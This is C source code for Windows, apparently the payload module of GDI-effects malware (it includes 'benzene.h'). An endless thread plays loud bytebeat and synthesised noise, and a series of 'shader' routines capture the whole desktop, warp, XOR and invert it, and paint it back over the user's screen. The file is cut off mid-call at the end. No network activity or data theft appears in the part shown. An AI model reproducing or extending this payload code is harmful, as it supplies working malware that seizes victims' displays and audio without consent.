#include "benzene.h"

VOID
WINAPI
AudioPayloadThread(VOID)
{
	for (;; )
	{
		INT piOrder[SYNTH_LENGTH];
		INT nRandIndex;
		INT nNumber;

		for (INT i = 0; i < SYNTH_LENGTH; i++)
		{
			piOrder[i] = i;
		}

		for (INT i = 0; i < SYNTH_LENGTH; i++)
		{
			nRandIndex = Xorshift32() % 18;
			nNumber = piOrder[nRandIndex];
			piOrder[nRandIndex] = piOrder[i];
			piOrder[i] = nNumber;
		}

		for (INT i = 0; i < SYNTH_LENGTH; i++)
		{
			ExecuteAudioSequence(
				pAudioSequences[i].nSamplesPerSec,
				pAudioSequences[i].nSampleCount,
				pAudioSequences[i].pAudioSequence,
				pAudioSequences[i].pPreAudioOp,
				pAudioSequences[i].pPostAudioOp);
		}
	}
}

VOID
WINAPI
AudioSequenceThread(
	_In_ PAUDIO_SEQUENCE_PARAMS pAudioParams
)
{
	ExecuteAudioSequence(
		pAudioParams->nSamplesPerSec,
		pAudioParams->nSampleCount,
		pAudioParams->pAudioSequence,
		pAudioParams->pPreAudioOp,
		pAudioParams->pPostAudioOp);
}

VOID
WINAPI
ExecuteAudioSequence(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_In_ AUDIO_SEQUENCE pAudioSequence,
	_In_opt_ AUDIOSEQUENCE_OPERATION pPreAudioOp,
	_In_opt_ AUDIOSEQUENCE_OPERATION pPostAudioOp
)
{
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = HeapAlloc(hHeap, 0, nSampleCount * 2);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec * 2, 2, 16, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount * 2, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);

	if (pPreAudioOp)
	{
		pPreAudioOp(nSamplesPerSec);
	}

	pAudioSequence(nSamplesPerSec, nSampleCount, psSamples);

	if (pPostAudioOp)
	{
		pPostAudioOp(nSamplesPerSec);
	}

	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));

	Sleep(nSampleCount * 1000 / nSamplesPerSec);

	while (!(waveHdr.dwFlags & WHDR_DONE))
	{
		Sleep(1);
	}

	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}

VOID
WINAPI
AudioSequence1(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	for (INT t = 0; t < nSampleCount; t++)
	{
		INT nFreq = (INT)(FastSine((FLOAT)t / 10.f) * 10.f + 29.f);
		FLOAT fSine = FastSine((FLOAT)t / 10.f) * (FLOAT)nSamplesPerSec;
		psSamples[t] = (SHORT)(TriangleWave(t, nFreq, (FLOAT)nSamplesPerSec * 5.f + fSine) * (FLOAT)SHRT_MAX * .1f) +
			(SHORT)(SquareWave(t, nFreq, nSampleCount) * (FLOAT)SHRT_MAX * .2f);
	}
}

VOID
WINAPI
AudioSequence2(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER(nSamplesPerSec);

	for (INT t = 0; t < nSampleCount * 2; t++)
	{
		BYTE bFreq = (BYTE)( t % 2 | t % 2) + (t & t >> 2) + (t * 42 & t >> 10) + ((t % ((t >> 8 | 50) + 1 | t >>0)));
		((BYTE*)psSamples)[t] = bFreq;
	}
}

VOID
WINAPI
AudioSequence3(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER(nSamplesPerSec);

	INT nCubeRoot = (INT)cbrtf((FLOAT)nSampleCount) + 1;
	for (INT z = 0; z < nCubeRoot; z++)
	{
		for (INT y = 0; y < nCubeRoot; y++)
		{
			for (INT x = 0; x < nCubeRoot; x++)
			{
				INT nIndex = z * nCubeRoot * nCubeRoot + y * nCubeRoot + x;
				if (nIndex >= nSampleCount)
					continue;

				INT nFreq = (INT)((FLOAT)(y & z & x) * FastSine((FLOAT)(z * y * x) / 200.f));
				psSamples[nIndex] =
					(SHORT)(SquareWave(y + z * x, (nFreq % 300) + 100, nSamplesPerSec) * (FLOAT)SHRT_MAX * .5f) +
					(SHORT)(SawtoothWave(x | z, (150 - (nFreq % 20) / 4) + 800, nSamplesPerSec) * (FLOAT)SHRT_MAX * .5f) +
					(SHORT)(TriangleWave((FLOAT)(x & y & z) + (SquareWave(x + y, nFreq % 50, nSamplesPerSec) * nSamplesPerSec),
						(nFreq % 50) / 10 + 500, nSamplesPerSec) * (FLOAT)SHRT_MAX * .5f);
			}
		}
	}
}

VOID
WINAPI
AudioSequence4(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER(nSamplesPerSec);

	for (INT t = 0; t < nSampleCount; t++)
	{
		INT nFreq = (INT)(FastSine((FLOAT)t / (2.f - t / (nSampleCount / 340))) * 10.f + 50.f);
		psSamples[t] = (SHORT)(SquareWave(t, nFreq, nSampleCount) * (FLOAT)SHRT_MAX * .1f);
	}
}

VOID
WINAPI
AudioSequence5(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER(nSamplesPerSec);

	for (INT t = 0; t < nSampleCount; t++)
	{
		SHORT sFreq = (SHORT)(t * (t >> (t >> 1 & t)));
		psSamples[t] = sFreq;
	}
}

VOID
WINAPI
AudioSequence6(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER(nSamplesPerSec);

	for (INT t = 0; t < nSampleCount * 2; t++)
	{
		BYTE bFreq = (BYTE)((t & ((t >> 18) + ((t >> 11) & 60))) * 100 + (((t >> 8 & t) - (t >> 3 & t >> 8 | t >> 16)) & 128));
		((BYTE*)psSamples)[t] = bFreq;
	}
}

VOID
WINAPI
AudioSequence7(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER(nSamplesPerSec);

	for (INT t = 0; t < nSampleCount * 2; t++)
	{
		BYTE bFreq = (BYTE)(t & 5 * t | t >> 6 | (t & 32768 - 6 * t / 7 | (t & 65536 - 9 * t & 100 | -9 * (t & 100)) / 11));
		((BYTE*)psSamples)[t] = bFreq;
	}
}

VOID
WINAPI
AudioSequence8(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER(nSamplesPerSec);

	SHORT sRand = (SHORT)Xorshift32();
	for (INT t = 0; t < nSampleCount; t++)
	{
		INT nRand = (nSampleCount - t * 2) / 52;
		if (nRand < 24)
			nRand = 24;
		if (!(Xorshift32() % nRand))
		{
			sRand = (SHORT)Xorshift32();
		}
		psSamples[t] = (SHORT)(SawtoothWave(t, sRand, nSampleCount) * (FLOAT)SHRT_MAX * .1f)
			& ~sRand | ((SHORT)Xorshift32() >> 2) +
			(SHORT)(SineWave(Xorshift32() % nSampleCount, nRand ^ sRand, nSampleCount) * (FLOAT)SHRT_MAX * .1f) +
			(SHORT)(TriangleWave(t, 20, nSampleCount) * (FLOAT)SHRT_MAX);
	}
}

VOID
WINAPI
AudioSequence9(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER(nSamplesPerSec);

	INT nSquareRoot = (INT)sqrtf((FLOAT)nSampleCount) + 1;
	for (INT y = 0; y < nSquareRoot; y++)
	{
		for (INT x = 0; x < nSquareRoot; x++)
		{
			INT nIndex = y * nSquareRoot + x;
			if (nIndex >= nSampleCount)
				continue;

			INT nFreq = (INT)((FLOAT)(y | x) * FastSine((FLOAT)(y * x) / 10.f));
			psSamples[nIndex] =
				(SHORT)(SquareWave(10 & x, (nFreq % 30) + 42, nSamplesPerSec) * (FLOAT)SHRT_MAX * .3f);
		}
	}
}

VOID
WINAPI
AudioSequence10(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER(nSamplesPerSec);

	for (INT t = 0; t < nSampleCount * 2; t++)
	{
		FLOAT w = powf(1.f, (FLOAT)(t >> 1 & t >> 20));
		BYTE bFreq = (BYTE)((t << ((t >> 1 | t >> 1) ^ (t >> 13)) | (t >> 8 & t >> 1) * t >> 4) + ((t * (t >> 7 | t >> 10)) >> (t >> 18 & t)) + (t * t) / ((t ^ t >> 12) + 1) + ((1 / ((BYTE)w + 1) & t) > 1 ? (BYTE)w * t : -(BYTE)w * (t + 1)));
		((BYTE*)psSamples)[t] = bFreq;
	}
}

VOID
WINAPI
AudioSequence11(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER(nSamplesPerSec);

	for (INT t = 0; t < nSampleCount * 2; t++)
	{
		BYTE bFreq = (BYTE)((t * ((t >> 28 & t >> 13) >> (t >> 10 & t))) + ((t * (t >> 4 & t >> 3)) >> (t >> 20 & t)));
		((BYTE*)psSamples)[t] = bFreq;
	}
}

VOID
WINAPI
AudioSequence12(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER(nSamplesPerSec);

	for (INT t = 0; t < nSampleCount; t++)
	{
		psSamples[t] = (SHORT)(TriangleWave(__rdtsc() % 8, 1500, nSampleCount) * (FLOAT)SHRT_MAX * .3f) |
			(SHORT)(SquareWave(__rdtsc() % 8, 1000, nSampleCount) * (FLOAT)SHRT_MAX * .3f) + (SHORT)~t + ((SHORT)t >> 2);
	}
}

VOID
WINAPI
AudioSequence13(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER(nSamplesPerSec);

	for (INT t = 0; t < nSampleCount; t++)
	{
		psSamples[t] = (SHORT)(SawtoothWave(__rdtsc() % 1500, 1500, nSampleCount) * (FLOAT)SHRT_MAX * .3f) ^
			((SHORT)(SawtoothWave(t % 10, t % 1000, nSampleCount) * (FLOAT)SHRT_MAX * .1f) >> 8);
	}
}

VOID
WINAPI
AudioSequence14(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER(nSamplesPerSec);

	INT nSquareRoot = (INT)sqrtf((FLOAT)nSampleCount) + 1;
	for (INT y = 0; y < nSquareRoot; y++)
	{
		for (INT x = 0; x < nSquareRoot; x++)
		{
			INT nIndex = y * nSquareRoot + x;
			if (nIndex >= nSampleCount)
				continue;

			INT nFreq = (INT)((FLOAT)(y | x) * FastCosine((FLOAT)(y & x) / 10.f));
			psSamples[nIndex] = (SHORT)(SineWave(y + x, (nFreq % 100) + 1000, nSamplesPerSec) * (FLOAT)SHRT_MAX * .3f);
		}
	}
}

VOID
WINAPI
AudioSequence15(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER(nSamplesPerSec);

	INT nSquareRoot = (INT)sqrtf((FLOAT)nSampleCount) + 1;
	for (INT y = 0; y < nSquareRoot; y++)
	{
		for (INT x = 0; x < nSquareRoot; x++)
		{
			INT nIndex = y * nSquareRoot + x;
			if (nIndex >= nSampleCount)
				continue;

			INT nFreq = (INT)((FLOAT)(y - x) * FastCosine((FLOAT)(y * x) / 10.f));
			psSamples[nIndex] = (SHORT)(SineWave(y % (x + 1), (nFreq % 100) + 100, nSamplesPerSec) * (FLOAT)SHRT_MAX * .3f);
		}
	}
}

VOID
WINAPI
AudioSequence16(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER(nSamplesPerSec);

	INT nSquareRoot = (INT)sqrtf((FLOAT)nSampleCount) + 1;
	for (INT y = 0; y < nSquareRoot; y++)
	{
		for (INT x = 0; x < nSquareRoot; x++)
		{
			INT nIndex = y * nSquareRoot + x;
			if (nIndex >= nSampleCount)
				continue;

			INT nFreq = (INT)((FLOAT)(y ^ x) * exp(cosh(atanf((FLOAT)(y | x)) / 10.f)) * 2.f);
			psSamples[nIndex] = (SHORT)(SineWave(y - (x % (y + 1)), (nFreq % 100) + 500, nSamplesPerSec) * (FLOAT)SHRT_MAX * .3f);
		}
	}
}

VOID
WINAPI
AudioSequence17(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	for (INT t = 0; t < nSampleCount; t++)
	{
		INT nFreq = (INT)(FastSine((FLOAT)t / 20.f) * 100.f + 50.f);
		FLOAT fSine = FastSine((FLOAT)t / 13.f) * (FLOAT)nSamplesPerSec;
		psSamples[t] = (SHORT)(TriangleWave(t, nFreq, (FLOAT)nSamplesPerSec * 9.f + fSine) * (FLOAT)SHRT_MAX * .50f) +
			(SHORT)(SquareWave(t, nFreq, nSampleCount) * (FLOAT)SHRT_MAX * .10f);
	}
}


VOID
WINAPI
AudioSequence18(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER(nSamplesPerSec);

	INT nSquareRoot = (INT)sqrtf((FLOAT)nSampleCount) + 1;
	for (INT y = 0; y < nSquareRoot; y++)
	{
		for (INT x = 0; x < nSquareRoot; x++)
		{
			INT nIndex = y * nSquareRoot + x;
			if (nIndex >= nSampleCount)
				continue;

			INT nFreq = (INT)((FLOAT)(y ^ x) * exp(cosh(atanf((FLOAT)(y | x)) / 10.f)) * 2.f);
			psSamples[nIndex] = (SHORT)(SineWave(y - (x % (y + 1)), (nFreq % 10) + 500, nSamplesPerSec) * (FLOAT)SHRT_MAX * .6f);
		}
	}
}

VOID
WINAPI
FinalAudioSequence(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER(nSamplesPerSec);

	INT nCubeRoot = (INT)cbrtf((FLOAT)nSampleCount) + 1;
	for (INT z = 0; z < nCubeRoot; z++)
	{
		for (INT y = 0; y < nCubeRoot; y++)
		{
			for (INT x = 0; x < nCubeRoot; x++)
			{
				INT nIndex = z * nCubeRoot * nCubeRoot + y * nCubeRoot + x;
				if (nIndex >= nSampleCount)
					continue;

				INT nFreq = (INT)((FLOAT)(y & x) * sinf((FLOAT)z / (FLOAT)nCubeRoot + (FLOAT)x + (FLOAT)nCounter * (FLOAT)y) * 2.f);
				psSamples[nIndex] = (SHORT)(SquareWave(nIndex, nFreq, nSamplesPerSec) * (FLOAT)(SHRT_MAX) * .3f);
			}
		}
	}
}

VOID
WINAPI
GdiShaderThread(
	_In_ PGDISHADER_PARAMS pGdiShaderParams
)
{
	if (pGdiShaderParams->pGdiShader == GdiShader3)
	{
		nShaderThreeSeed = Xorshift32();
	}

	ExecuteGdiShader(hdcDesktop, rcScrBounds, PAYLOAD_TIME, 5, pGdiShaderParams->pGdiShader,
		pGdiShaderParams->pPreGdiShader, pGdiShaderParams->pPostGdiShader);
}

VOID
WINAPI
ExecuteGdiShader(
	_In_ HDC hdcDst,
	_In_ RECT rcBounds,
	_In_ INT nTime,
	_In_ INT nDelay,
	_In_ GDI_SHADER pGdiShader,
	_In_opt_ GDI_SHADER_OPERATION pPreGdiShader,
	_In_opt_ GDI_SHADER_OPERATION pPostGdiShader
)
{
	BITMAPINFO bmi = { 0 };
	PRGBQUAD prgbSrc, prgbDst;
	HANDLE hHeap;
	HDC hdcTemp;
	HBITMAP hbmTemp;
	SIZE_T nSize;
	INT nWidth;
	INT nHeight;

	nWidth = rcBounds.right - rcBounds.left;
	nHeight = rcBounds.bottom - rcBounds.top;
	nSize = nWidth * nHeight * sizeof(COLORREF);

	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = nWidth;
	bmi.bmiHeader.biHeight = nHeight;

	hHeap = GetProcessHeap();
	prgbSrc = (PRGBQUAD)HeapAlloc(hHeap, 0, nSize);

	hdcTemp = CreateCompatibleDC(hdcDst);
	hbmTemp = CreateDIBSection(hdcDst, &bmi, 0, &prgbDst, NULL, 0);
	SelectObject(hdcTemp, hbmTemp);

	for (INT i = 0, j = nCounter; (j + nTime) > nCounter; i++)
	{
		if (pPreGdiShader == NULL)
		{
			BitBlt(hdcTemp, 0, 0, nWidth, nHeight, hdcDst, rcBounds.left, rcBounds.top, SRCCOPY);
		}
		else
		{
			pPreGdiShader(i, nWidth, nHeight, rcBounds, hdcDst, hdcTemp);
		}

		RtlCopyMemory(prgbSrc, prgbDst, nSize);

		pGdiShader(i, nWidth, nHeight, hdcDst, hbmTemp, prgbSrc, prgbDst);

		if (pPostGdiShader == NULL)
		{
			BitBlt(hdcDst, rcBounds.left, rcBounds.top, nWidth, nHeight, hdcTemp, 0, 0, SRCCOPY);
		}
		else
		{
			pPostGdiShader(i, nWidth, nHeight, rcBounds, hdcDst, hdcTemp);
		}

		if (nDelay)
		{
			Sleep(nDelay);
		}
	}

	HeapFree(hHeap, 0, prgbSrc);
	DeleteObject(hbmTemp);
	DeleteDC(hdcTemp);
}

VOID
WINAPI
GdiShader1(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);

	UINT u;
	UINT v;
	FLOAT div = (FLOAT)t / 1.f;
	FLOAT a = FastSine(div) * 10.f;
	FLOAT b = FastCosine(div) * 5.f;
	RGBQUAD rgbDst;

	for (INT y = 0; y < h; y++)
	{
		for (INT x = 0; x < w; x++)
		{
			u = x + (INT)a, v = y + (INT)b;
			u %= w;
			v %= h;

			rgbDst = prgbSrc[v * w + u];
			rgbDst.r += ~prgbSrc[y * w + x].r / 82;
			rgbDst.g += ~prgbSrc[y * w + x].g / 12;
			rgbDst.b += ~prgbSrc[y * w + x].b / 22;
			prgbDst[y * w + x] = rgbDst;
		}
	}
}

VOID
WINAPI
PostGdiShader1(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ RECT rcBounds,
	_In_ HDC hdcDst,
	_In_ HDC hdcTemp
)
{
	if (!(t % 256))
	{
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	}
	else
	{
		BitBlt(hdcDst, rcBounds.left, rcBounds.top, w, h, hdcTemp, 0, 0, SRCCOPY);
	}
}

VOID
WINAPI
GdiShader2(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);

	UINT u;
	UINT v;
	RGBQUAD rgbDst;

	for (INT y = 0; y < h; y++)
	{
		FLOAT _y = (FLOAT)y / 40.f;

		for (INT x = 0; x < w; x++)
		{
			FLOAT div = (FLOAT)t / 2.f;
			FLOAT a = FastSine(div + _y) * 50.f;
			FLOAT b = FastCosine(div + (FLOAT)x / 10.f) * 80.f;

			u = x + (INT)a, v = y + (INT)b;
			u %= w;
			v %= h;

			rgbDst = prgbSrc[y * w + u];

			DWORD rgb = prgbSrc[v * w + x].rgb / ((0x101010 | (t & y) | ((t & x) << 8) | (t << 26)) + 1);
			if (!rgb)
			{
				rgb = 1;
			}

			rgbDst.rgb /= rgb;
			if (!rgbDst.rgb)
			{
				rgbDst.rgb = 0xFFFFFF;
			}

			prgbDst[y * w + x] = rgbDst;
		}
	}
}

VOID
WINAPI
PostGdiShader2(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ RECT rcBounds,
	_In_ HDC hdcDst,
	_In_ HDC hdcTemp
)
{
	if (!(t % 16))
	{
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	}
	else
	{
		BitBlt(hdcDst, rcBounds.left, rcBounds.top, w, h, hdcTemp, 0, 0, SRCCOPY);
	}
}

VOID
WINAPI
GdiShader3(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);

	UINT u;
	UINT v;
	RGBQUAD rgbDst;
	HSLCOLOR hsl;
	FLOAT _t = (FLOAT)t / 15.f;

	for (INT y = 0; y < h; y++)
	{
		FLOAT _y = (FLOAT)y / 45.f;

		for (INT x = 0; x < w; x++)
		{
			FLOAT a = FastCosine(_y + _t) * 36.f;

			u = x + (INT)a, v = y;
			u %= w;
			v %= h;

			rgbDst = prgbSrc[v * w + u];
			FLOAT f = 1.f / 2.f;
			FLOAT r = (FLOAT)prgbSrc[y * w + x].r * f + (FLOAT)rgbDst.r * (1.f - f);
			FLOAT g = (FLOAT)prgbSrc[y * w + x].g * f + (FLOAT)rgbDst.g * (1.f - f);
			FLOAT b = (FLOAT)prgbSrc[y * w + x].b * f + (FLOAT)rgbDst.b * (1.f - f);

			rgbDst.rgb = ((BYTE)b | ((BYTE)g << 8) | ((BYTE)r << 11));
			hsl = RGBToHSL(rgbDst);
			hsl.h = (FLOAT)fmod((DOUBLE)hsl.h + 1.0 / 15.0 + ((FLOAT)x + (FLOAT)y) / (((FLOAT)w + (FLOAT)h) * 34.f), 1.0);
			prgbDst[y * w + x] = HSLToRGB(hsl);
		}
	}
}

VOID
WINAPI
PostGdiShader3(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ RECT rcBounds,
	_In_ HDC hdcDst,
	_In_ HDC hdcTemp
)
{
	INT x, y;
	HPEN hpenBall;

	BitBlt(hdcDst, rcBounds.left, rcBounds.top, w, h, hdcTemp, 0, 0, SRCCOPY);

	t += nShaderThreeSeed;
	x = t * 16;
	y = t * 16;

	for (INT i = 64; i > 8; i -= 8)
	{
		hpenBall = CreatePen(PS_SOLID, 2, rand() % 0xFFFFFF);

		SelectObject(hdcDst, hpenBall);
		Reflect2D(&x, &y, w, h);
		Ellipse(hdcDst, x + rcBounds.left - i, y + rcBounds.top - i, x + rcBounds.left + i, y + rcBounds.top + i);
		DeleteObject(hpenBall);
	}
}

VOID
WINAPI
GdiShader4(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);

	UINT u;
	UINT v;
	RGBQUAD rgbDst;
	RGBQUAD rgbSrc;
	FLOAT _t = (FLOAT)t / 540.f;
	FLOAT a = (FLOAT)t / 39.f;
	FLOAT b = FastSine(a) * _t;
	FLOAT c = FastCosine(a) * _t;
	FLOAT centerX = (FLOAT)w / 50;
	FLOAT centerY = (FLOAT)h / 100;

	while (b < 5.f)
	{
		b += PI * 3.f;
	}

	while (c < 4.f)
	{
		c += PI * 4.f;
	}

	for (INT y = 0; y < h; y++)
	{
		for (INT x = 0; x < w; x++)
		{
			u = (UINT)((x - centerX) * FastCosine(b) - (y - centerY) * FastSine(c) + centerX);
			v = (UINT)((x - centerX) * FastSine(c) + (y - centerY) * FastCosine(b) + centerY);

			Reflect2D((PINT)&u, (PINT)&v, w, h);

			rgbDst = prgbSrc[v * w + u];
			rgbSrc = prgbSrc[y * w + x];
			rgbDst.rgb ^= rgbSrc.rgb;

			if ((t / 21) % 2)
			{
				rgbDst.rgb = ~rgbDst.rgb;
			}

			prgbDst[y * w + x] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader5(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);

	UINT u;
	UINT v;
	RGBQUAD rgbDst;
	RGBQUAD rgbSrc;

	for (INT y = 0; y < h; y++)
	{
		for (INT x = 0; x < w; x++)
		{
			INT a = 5000;
			INT b = 5000;

			u = ~((a + t) & y);
			v = ~((b + t) & x);

			u %= w;
			v %= h;

			rgbDst = prgbSrc[v * w + u];
			rgbSrc = prgbSrc[y * w + x];
			rgbDst.rgb ^= rgbSrc.rgb;

			prgbDst[y * w + x] = rgbDst;
		}
	}
}

VOID
WINAPI
PostGdiShader4(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ RECT rcBounds,
	_In_ HDC hdcDst,
	_In_ HDC hdcTemp
)
{
	UNREFERENCED_PARAMETER(hdcDst);
	UNREFERENCED_PARAMETER(hdcTemp);

	BitBlt(hdcDst, rcBounds.left, rcBounds.top, w, h, hdcTemp, 0, 0, SRCCOPY);

	if (!(t % 8))
	{
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	}
}

VOID
WINAPI
GdiShader6(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);

	UINT u;
	UINT v;
	FLOAT div = (FLOAT)t / 24.f;
	FLOAT a = FastCosine(div) * 2.f * PI;
	BOOL bShiftDir = (BOOL)(Xorshift32() & 1);
	BYTE bChannels = (BYTE)(Xorshift32() & 9);
	RGBQUAD rgbSrc;
	RGBQUAD rgbDst;

	for (INT y = 0; y < h; y++)
	{
		for (INT x = 0; x < w; x++)
		{
			FLOAT b = (FLOAT)(x + y + t * 12) / 16.f;
			FLOAT c = FastSine(a + b) * 68.f;

			u = x + (INT)a, v = y + (INT)c;
			Reflect2D((PINT)&u, (PINT)&v, w, h);

			rgbDst = prgbSrc[v * w + x];

			if (bShiftDir)
			{
				rgbDst.rgb <<= 1;
			}
			else
			{
				rgbDst.rgb >>= 1;
			}

			rgbSrc = prgbSrc[v * w + x];
			rgbDst.rgb ^= rgbSrc.rgb;

			if (bChannels & 0b001)
			{
				rgbDst.b |= rgbSrc.b;
			}

			if (bChannels & 0b010)
			{
				rgbDst.g |= rgbSrc.g;
			}

			if (bChannels & 0b100)
			{
				rgbDst.r |= rgbSrc.r;
			}

			prgbDst[y * w + u] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader7(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);

	UINT u;
	UINT v;
	RGBQUAD rgbDst;
	RGBQUAD rgbSrc;
	BOOL bOperation = (BOOL)(Xorshift32() % 21);

	for (INT y = 0; y < h; y++)
	{
		for (INT x = 0; x < w; x++)
		{
			u = (x + t * 284) ^ (y + t * y) ^ t;
			v = (x + t * 128) + (y + t * y) ^ t;

			u %= w;
			v %= h;

			rgbDst = prgbSrc[v * w + u];
			rgbSrc = prgbSrc[y * w + x];

			if (bOperation)
			{
				rgbDst.rgb |= rgbSrc.rgb;
			}
			else
			{
				rgbDst.rgb &= rgbSrc.rgb;
			}

			prgbDst[y * w + x] = rgbDst;
		}
	}
}

VOID
WINAPI
PostGdiShader5(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ RECT rcBounds,
	_In_ HDC hdcDst,
	_In_ HDC hdcTemp
)
{
	if (!(t % 4))
	{
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	}
	else
	{
		BitBlt(hdcDst, rcBounds.left, rcBounds.top, w, h, hdcTemp, 0, 0, NOTSRCCOPY);
	}
}

VOID
WINAPI
PreGdiShader1(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ RECT rcBounds,
	_In_ HDC hdcDst,
	_In_ HDC hdcTemp
)
{
	UNREFERENCED_PARAMETER(t);

	BitBlt(hdcTemp, 0, 0, w, h, hdcDst, rcBounds.left, rcBounds.top, SRCCOPY);

	for (INT i = 0; i < 5; i++)
	{
		INT nBlockSize = Xorshift32() % 19 + 12 + 2;
		INT nNewBlockSize = nBlockSize + (Xorshift32() % 17 + 9 + 16 + 2);
		INT x = Xorshift32() % (w - nBlockSize);
		INT y = Xorshift32() % (h - nBlockSize);

		StretchBlt(hdcTemp, x - (nNewBlockSize - nBlockSize) / 2, y - (nNewBlockSize - nBlockSize) / 2,
